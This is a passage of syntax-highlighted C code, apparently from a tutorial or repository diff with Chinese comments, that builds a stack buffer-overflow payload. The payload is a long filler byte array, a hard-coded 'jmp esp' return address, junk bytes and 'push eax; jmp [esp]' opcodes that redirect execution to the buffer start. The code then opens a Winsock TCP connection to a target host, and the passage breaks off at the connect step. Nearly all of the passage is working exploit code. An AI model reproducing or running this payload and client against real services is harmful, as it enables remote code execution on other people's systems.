+        <span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xCD</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xDA</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xF4</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xFC</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xA5</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xD9</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span>
+        <span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xF2</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span>
+        <span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xFB</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xE3</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xED</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span>
+        <span class="mh">0xC6</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xF3</span><span class="p">,</span><span class="mh">0xF9</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xD1</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xF1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span><span class="mh">0xF7</span><span class="p">,</span><span class="mh">0xEF</span><span class="p">,</span>
+        <span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xD1</span><span class="p">,</span><span class="mh">0xEF</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xEC</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xE5</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xF7</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xF3</span><span class="p">,</span>
+        <span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xDD</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xCD</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xD8</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xBF</span><span class="p">,</span>
+        <span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xF3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xAA</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xF4</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xD5</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span>
+        <span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xCD</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xDA</span><span class="p">,</span>
+        <span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xDE</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xFD</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span>
+        <span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xF6</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xDA</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xAE</span><span class="p">,</span>
+        <span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xE9</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xAE</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xD5</span><span class="p">,</span><span class="mh">0xE6</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xAA</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xFC</span><span class="p">,</span>
+        <span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xAA</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xE7</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xBF</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span>
+        <span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xD5</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xD1</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xF2</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xDA</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span>
+        <span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xD8</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xFC</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span><span class="mh">0xAE</span><span class="p">,</span><span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xF7</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span>
+        <span class="mh">0xE1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xE4</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xE3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span>
+        <span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xC2</span><span class="p">,</span><span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xF6</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xF9</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xF4</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xF4</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span>
+        <span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xC2</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xF6</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xE9</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xF9</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span>
+        <span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xDE</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xFD</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span>
+        <span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xE1</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xED</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xDE</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xE7</span><span class="p">,</span>
+        <span class="mh">0xCD</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xB9</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xD5</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xA9</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span>
+        <span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xDA</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xE4</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xE1</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xE1</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span>
+        <span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0xCD</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xED</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span>
+        <span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xE2</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xE5</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xD1</span><span class="p">,</span><span class="mh">0xB9</span><span class="p">,</span><span class="mh">0xFD</span><span class="p">,</span>
+        <span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xAA</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xF2</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span>
+        <span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xA9</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span>
+        <span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xFB</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xAE</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span>
+        <span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xE0</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xFB</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xAB</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span>
+        <span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xE2</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xE8</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span><span class="mh">0xE8</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xDF</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span>
+        <span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xE2</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xE8</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span><span class="mh">0xE8</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xDF</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span>
+        <span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xE2</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xE8</span><span class="p">,</span><span class="mh">0xAD</span><span class="p">,</span><span class="mh">0xE8</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xDF</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xDF</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC6</span><span class="p">,</span>   
+        <span class="c1">//到这里填充字节结束      
+</span><span class="c1"></span>        
+        <span class="c1">//下面是jmp esp    这里esp会返回到4个字节后，因为是retn 0x4      
+</span><span class="c1"></span>        <span class="mh">0x12</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0x7F</span><span class="p">,</span>   <span class="c1">//栈区，retn处的4个字节
+</span><span class="c1"></span>        <span class="c1">//垃圾字节 byte
+</span><span class="c1"></span>        <span class="mh">0x61</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span>
+        <span class="c1">// push eax   
+</span><span class="c1"></span>        <span class="c1">// jmp [esp]   这俩句跳到缓冲区开头
+</span><span class="c1"></span>        <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span>
+    <span class="p">};</span>
+<span class="c1">//socket
+</span><span class="c1"></span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">numbytes</span><span class="p">;</span> 
+<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">MAXDATASIZE</span><span class="p">];</span> 
+<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">their_addr</span><span class="p">;</span>        <span class="cm">/* 对方的地址端口信息 */</span> 
+<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> 
+<span class="p">{</span> 
+           <span class="c1">//需要有服务端ip参数
+</span><span class="c1"></span>           <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;usage: client hostname</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
+           <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> 
+<span class="p">}</span> 
+ <span class="n">WSADATA</span> <span class="n">ws</span><span class="p">;</span>
+<span class="n">WSAStartup</span><span class="p">(</span><span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">),</span><span class="o">&amp;</span><span class="n">ws</span><span class="p">);</span>         <span class="c1">//初始化Windows Socket Dll
+</span><span class="c1"></span> <span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span> 
+           <span class="c1">//如果建立socket失败，退出程序
+</span><span class="c1"></span>           <span class="n">printf</span><span class="p">(</span><span class="s">&#34;socket error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
+           <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> 
+<span class="p">}</span> 
+<span class="c1">//连接对方
